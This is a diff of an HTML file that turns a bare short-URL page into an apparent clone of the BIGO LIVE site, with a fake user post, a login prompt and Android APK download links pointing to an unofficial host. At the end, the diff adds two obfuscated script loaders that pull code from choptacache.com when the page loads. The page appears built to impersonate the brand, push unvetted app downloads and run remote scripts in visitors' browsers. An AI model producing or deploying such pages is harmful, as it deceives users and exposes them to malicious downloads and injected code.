@@ -2,31 +2,233 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <title>Bigo - Short URL App</title>
-    <style>
-        .center {
-            width: calc(100vw - 10px);
-            height: calc(100vh - 10px);
-            margin: auto;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .content {
-            text-align: center;
-            width: 400px;
-        }
-    </style>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>BIGO LIVE</title>
+  <meta content='width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1' name='viewport' />
+  <meta data-n-head="ssr" data-hid="keywords" name="keywords"
+    content="LIVE broadcasts,BIGO LIVE,Game broadcasting,video streaming">
+  <meta data-n-head="ssr" data-hid="og:site_name" property="og:site_name" content="www.bigo.tv">
+  <meta data-n-head="ssr" data-hid="al:ios:app_store_id" property="al:ios:app_store_id" content="1077137248">
+  <meta data-n-head="ssr" data-hid="al:ios:app_name" property="al:ios:app_name" content="BIGO LIVE">
+  <meta data-n-head="ssr" data-hid="al:android:package" property="al:android:package" content="sg.bigo.live">
+  <meta data-n-head="ssr" data-hid="al:android:app_name" property="al:android:app_name" content="BIGO LIVE">
+  <meta data-n-head="ssr" data-hid="apple-mobile-web-app-title" property="apple-mobile-web-app-title"
+    content="BIGO LIVE">
+  <meta data-n-head="ssr" data-hid="twitter:card" name="twitter:card" content="summary">
+  <meta data-n-head="ssr" data-hid="twitter:site" name="twitter:site" content="@BIGOLIVEapp">
+  <meta data-n-head="ssr" http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  <meta data-n-head="ssr" data-hid="mobile-web-app-capable" name="mobile-web-app-capable" content="yes">
+  <meta data-n-head="ssr" data-hid="author" name="author" content="jiurigege">
+  <meta data-n-head="ssr" data-hid="theme-color" name="theme-color" content="#f5f7fa">
+  <meta data-n-head="ssr" data-hid="i18n-og" property="og:locale" content="en">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-ar" property="og:locale:alternate" content="ar">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-de" property="og:locale:alternate" content="de">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-es" property="og:locale:alternate" content="es">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-fr" property="og:locale:alternate" content="fr">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-hi" property="og:locale:alternate" content="hi">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-id" property="og:locale:alternate" content="id">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-it" property="og:locale:alternate" content="it">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-ja" property="og:locale:alternate" content="ja">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-ko" property="og:locale:alternate" content="ko">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-my" property="og:locale:alternate" content="my">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-ms" property="og:locale:alternate" content="ms">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-nl" property="og:locale:alternate" content="nl">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-pl" property="og:locale:alternate" content="pl">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-pt" property="og:locale:alternate" content="pt">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-ro" property="og:locale:alternate" content="ro">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-ru" property="og:locale:alternate" content="ru">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-sv" property="og:locale:alternate" content="sv">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-th" property="og:locale:alternate" content="th">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-tr" property="og:locale:alternate" content="tr">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-vi" property="og:locale:alternate" content="vi">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-zh" property="og:locale:alternate" content="zh">
+  <meta data-n-head="ssr" data-hid="i18n-og-alt-zh-TW" property="og:locale:alternate" content="zh_TW">
+  <meta data-n-head="ssr" data-hid="title" name="title" content="BIGO LIVE">
+  <meta data-n-head="ssr" data-hid="og:title" property="og:title" content="BIGO LIVE">
+  <meta data-n-head="ssr" data-hid="description" name="description"
+    content="Watch all of bigo live streams and highlights on BIGO LIVE. Check photos and videos from bigo. Never miss a post from bigo!">
+  <meta data-n-head="ssr" data-hid="og:description" property="og:description"
+    content="Watch all of bigo live streams and highlights on BIGO LIVE. Check photos and videos from bigo. Never miss a post from bigo!">
+  <meta data-n-head="ssr" data-hid="al:ios:url" property="al:ios:url" content="https://v.aridjaya.com/bigo">
+  <meta data-n-head="ssr" data-hid="al:android:url" property="al:android:url" content="https://v.aridjaya.com/bigo">
+  <meta data-n-head="ssr" data-hid="al:web:url" property="al:web:url" content="https://v.aridjaya.com/bigo">
+  <meta data-n-head="ssr" data-hid="og:image" property="og:image" content="icon.png">
+  <meta data-n-head="ssr" data-hid="og:url" property="og:url" content="https://v.aridjaya.com/bigo">
+  <meta data-n-head="ssr" data-hid="og:type" property="og:type" content="website">
+  <meta data-n-head="ssr" data-hid="twitter:title" name="twitter:title" content="BIGO LIVE">
+  <meta data-n-head="ssr" data-hid="twitter:description" name="twitter:description"
+    content="Watch all of bigo live streams and highlights on BIGO LIVE. Check photos and videos from bigo. Never miss a post from bigo!">
+  <meta data-n-head="ssr" data-hid="twitter:image" name="twitter:image" content="https://v.aridjaya.com/bigo/icon.png">
+  <meta data-n-head="ssr" data-hid="twitter:url" name="twitter:url" content="https://v.aridjaya.com/bigo">
+  <link href="min.css" rel="stylesheet">
+  <script src='https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
 </head>
 
 <body>
-    <div class="center">
-        <div class="content">
-            <h1>Bigo Hasduk Merah Putih - Short URL App</h1>
+  <div class="def-container">
+    <header class="PageHead-Component">
+      <div class="head-left">
+        <div class="logo"><a><img src="logo-b.4bcead.png" alt=""></a>
         </div>
+        <ul class="nav">
+          <li><a href="" class="nuxt-link-active">Home</a></li>
+          <li><a href="games" class="">Gaming</a></li>
+          <li><a href="show" class="">LIVE</a></li>
+          <li><a href="bar" class="">Bar</a></li>
+        </ul>
+      </div>
+      <div class="head-right">
+        <ul class="head-right__tools">
+          <li class="head-right__tool-app"><a class="hover-blue icon-arrow">Connector</a>
+            <div class="load-box-transparent">
+              <div class="load-box">
+                <ul class="load-box__btns">
+                  <li><a href="/" target="_blank" class="icon-computer-new icon-new">BIGO LIVE Streamer</a></li>
+                  <li><a href="/" target="_blank" class="icon-computer">BIGO LIVE Connector</a></li>
+                  <li><a href="/" target="_blank" class="icon-obs">OBS Stream</a></li>
+                  <li><a href="/" target="_blank" class="icon-appStore">iOS</a></li>
+                  <li><a href="/" target="_blank" class="icon-android">Android</a></li>
+                </ul>
+              </div>
+            </div>
+          </li>
+          <li class="head-right__tool-app"><a href="javascript:;" class="hover-blue icon-arrow">APP</a>
+            <div class="load-box-transparent">
+              <div class="load-box">
+                <ul class="load-box__btns">
+                  <li><a target="_blank" href="https://itunes.apple.com/app/id1077137248" rel="noopener"
+                      class="icon-appStore">App Store</a></li>
+                  <li><a target="_blank" href="https://static-web.hzmk.site/as/bigo-static/apk/bigolive-bigotv.apk"
+                      rel="noopener" class="icon-android">Android Apk</a></li>
+                  <li><a target="_blank" href="https://static-web.hzmk.site/as/bigo-static/apk/bigolivelite-bigotv.apk"
+                      rel="noopener" class="icon-android">Lite Apk</a></li>
+                  <li><a target="_blank" href="https://play.google.com/store/apps/details?id=sg.bigo.live"
+                      rel="noopener" class="icon-googlePlay">Google Play</a></li>
+                </ul>
+              </div>
+            </div>
+          </li>
+        </ul>
+        <div class="head-right__login"><button class="head-right__login__btn">
+            Login
+          </button>
+          <div class="first-in" style="display:none;">
+            <div class="first-in-tips"></div> <button class="first-in-close"></button>
+            <div class="first-in-logo"></div>
+            <div class="first-in-right">
+              <div class="first-in-title">Log in for More Fun!</div>
+              <div class="first-in-desc">1. To have better experience on BIGO LIVE, “Scan to
+                login” is ready.</div>
+              <div class="first-in-desc">2. You can follow and chat with streamers after logging
+                in.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </header>
+    <div class="page-wrapper">
+      <div class="user-detail">
+        <div class="bar-list">
+          <div id="barItem" class="bar-item">
+            <div class="bar-container">
+              <div class="bar-user"><img src="profile.jpg" class="user-avatar user-hover">
+                <div class="user-info">
+                  <div class="user-name user-name-hover">
+                    🌸 Safira Amanda 💗👀
+                  </div>
+                  <div class="pulish-time">
+                    1 day ago
+                  </div>
+                </div>
+              </div>
+              <div class="bar-main">
+                <div class="content-wrapper">
+                  <input id="toggle" type="checkbox" class="toggleInput">
+                  <div id="descBox" class="content">
+                    <span>
+                      <script src="js/text.js"></script> 
+                    </span>
+                  </div>
+                </div>
+                <div class="circle">
+                  <div class="circle-icon"></div>
+                  <div class="circle-text">
+                    <script src="js/text.js"></script> 
+                  </div>
+                </div>
+                <div
+                  class="video-js vjs-big-play-centered vjs-paused video-dimensions vjs-controls-enabled vjs-workinghover vjs-v7 vjs-user-active"
+                  preload="none" webkit-playsinline="" playsinline="true" id="video" tabindex="-1" lang="en"
+                  role="region" aria-label="Video Player">
+                  <script src="js/bigo.js"></script>
+                </div>
+              </div>
+            </div>
+            <div class="bar-comment">
+              <div class="comment-like">
+                <div class="comment-num">comments</div>
+                <div class="share-like">
+                  <div class="share-poptip">
+                    <div class="poptip-dom-share">
+                      <div class="share">
+                        <div class="share-img"></div> <span class="share-like-text"></span>
+                      </div>
+                    </div>
+                    <!---->
+                  </div>
+                  <div class="down-poptip">
+                    <div>
+                      <div class="like">
+                        <div class="like-img"></div> <span class="share-like-text hover-text"></span>
+                      </div>
+                    </div>
+                    <!---->
+                  </div>
+                </div>
+              </div>
+              <div>
+                <div class="comment-input">
+                  <div class="down-poptip">
+                    <div>
+                      <div class="input-container">
+                        <input type="text" placeholder="Please log in to post a comment" disabled="disabled" value=""
+                          class="input">
+                      </div>
+                    </div>
+                    <!---->
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
+  </div>
+
+  <script>
+    (function (__htas) {
+        var d = document,
+            s = d.createElement('script'),
+            l = d.scripts[d.scripts.length - 1];
+        s.settings = __htas || {};
+        s.src =
+            "\/\/choptacache.com\/a\/Wu5JwJY.WIdplpQx2W9-kWZyTp9c6Hb_2h5oleSEW\/Qn9wNTDjQq0QN\/zzQW5vMMSV0u0ONPDWQd3ZNODWkGya";
+        l.parentNode.insertBefore(s, l);
+    })({})
+</script>
+
+<script>
+    (function (__htas) {
+        var d = document,
+            s = d.createElement('script'),
+            l = d.scripts[d.scripts.length - 1];
+        s.settings = __htas || {};
+        s.src = "\/\/choptacache.com\/cyD-9w6gb.2\/5ql\/SCWQQ\/9JNOD_QO0HNez\/Ucw\/OYSK0h0yNnDeQZ3INeThEFwM";
+        l.parentNode.insertBefore(s, l);
+    })({})
+</script>
+
 </body>
 
 </html>
